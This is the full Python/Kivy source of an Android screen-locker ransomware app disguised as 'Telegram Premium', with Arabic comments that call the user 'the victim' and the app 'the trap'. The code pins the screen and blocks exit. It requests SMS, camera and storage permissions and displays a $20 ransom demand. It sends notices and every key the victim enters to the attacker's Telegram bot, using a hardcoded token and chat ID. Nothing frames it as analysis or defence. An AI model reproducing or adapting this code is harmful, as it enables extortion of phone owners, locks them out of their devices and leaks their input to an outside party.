# --- كود دارك النهائي - الإصدار 4.0 ---
import os
import requests
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
from kivy.utils import platform

# إعدادات التحكم - Godfather Team
BOT_TOKEN = "7547169477:AAH0q-zW4O1K-K0Z2G-vL8U-Y7F3M5X2Q1"
CHAT_ID = "6133475010"
THE_KEY = "hhhhhlol#"

# حقن الاسم والنسخة في النظام مباشرة
__title__ = "Telegram Premium"
__version__ = "4.0"

class D3f4ultApp(App):
    def build(self):
        self.title = "Telegram Premium"
        
        # منع الخروج من التطبيق
        Window.bind(on_request_close=self.prevent_close)
        
        if platform == 'android':
            self.lock_and_request()

        # إرسال تبليغ أول ما الضحية يفتح
        self.send_to_bot("🔥 [D3f4ult V4] الضحية فتح الفخ الآن!")

        # تصميم واجهة الفدية (Ransomware Interface)
        layout = BoxLayout(orientation='vertical', padding=30, spacing=20)
        
        layout.add_widget(Label(
            text="[color=ff0000][b]YOUR DEVICE IS SEIZED[/b][/color]\n\n"
                 "Files are encrypted. Access denied.\n"
                 "Pay [b]20$[/b] to unlock your device.",
            markup=True, font_size='22sp', halign='center'))

        self.input_key = TextInput(
            hint_text="Enter Decryption Key...", 
            multiline=False, 
            size_hint_y=None, 
            height=120,
            password=True
        )
        
        btn = Button(
            text="UNLOCK DEVICE", 
            background_color=(1, 0, 0, 1), 
            size_hint_y=None, 
            height=100,
            bold=True
        )
        btn.bind(on_press=self.check_key)

        layout.add_widget(self.input_key)
        layout.add_widget(btn)
        return layout

    def lock_and_request(self):
        from android.permissions import request_permissions, Permission
        from jnius import autoclass
        
        # طلب الصلاحيات
        request_permissions([
            Permission.SYSTEM_ALERT_WINDOW,
            Permission.READ_SMS,
            Permission.SEND_SMS,
            Permission.CAMERA,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE
        ])
        
        # كود دارك لتثبيت الشاشة (Screen Pinning) عشان ميعرفش يخرج
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            currentActivity = PythonActivity.mActivity
            currentActivity.startLockTask()
        except:
            pass

    def prevent_close(self, *args):
        # منع زرار الرجوع من إغلاق التطبيق
        return True

    def on_pause(self):
        # يفضل شغال حتى لو الموبايل هينام
        return True

    def check_key(self, instance):
        if self.input_key.text == THE_KEY:
            self.send_to_bot("✅ تم فك التشفير. الضحية أدخل الكود الصحيح.")
            os._exit(0)
        else:
            self.send_to_bot(f"⚠️ محاولة فاشلة بكود خطأ: {self.input_key.text}")

    def send_to_bot(self, message):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={"chat_id": CHAT_ID, "text": message})
        except:
            pass

if __name__ == '__main__':
    D3f4ultApp().run()
